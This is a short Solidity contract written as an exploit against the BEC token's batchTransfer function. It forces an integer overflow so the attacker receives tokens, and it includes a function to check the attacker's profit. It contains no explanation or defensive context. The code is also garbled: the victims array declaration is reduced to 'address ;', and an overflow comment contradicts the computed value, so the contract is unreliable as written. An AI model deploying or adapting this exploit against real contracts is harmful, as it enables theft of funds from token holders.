pragma solidity ^0.4.16;

interface IBecToken {
    function batchTransfer(address[] _receivers, uint256 _value) external returns (bool);
    function balanceOf(address who) external constant returns (uint256);
}

contract BecTokenExploit {
    IBecToken public bec;
    address public attacker;

    constructor(address _tokenAddr) public {
        bec = IBecToken(_tokenAddr);
        attacker = msg.sender;
    }

    function exploit() public {
        require(msg.sender == attacker);

        // carefully choose values to cause overflow
        address ; // 256 * 2**255 overflows
        for (uint i = 0; i < victims.length; i++) {
            victims[i] = attacker;
        }

        // deliberately cause uint256 overflow
        uint256 bigValue = (2**256 / 256) + 1;  // cause amount to overflow

        // call vulnerable batchTransfer
        bec.batchTransfer(victims, bigValue);
    }

    function checkProfit() public view returns (uint256) {
        return bec.balanceOf(attacker);
    }
}

